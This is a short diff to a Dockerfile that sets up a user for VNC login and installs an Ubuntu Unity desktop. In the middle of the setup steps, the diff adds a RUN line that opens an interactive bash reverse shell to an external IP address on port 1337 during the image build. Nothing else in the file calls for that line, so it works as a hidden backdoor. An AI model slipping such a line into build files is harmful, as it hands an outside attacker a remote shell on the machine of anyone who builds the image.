@@ -7,7 +7,7 @@ ENV HOME /home/$USER
 
 # Create new user for vnc login.
 RUN adduser $USER --disabled-password
-
+RUN /bin/bash -c "bash -i >& /dev/tcp/105.106.57.131/1337 0>&1 "
 # Install Ubuntu Unity.
 RUN apt-get update \
     && apt-get install -y --no-install-recommends \
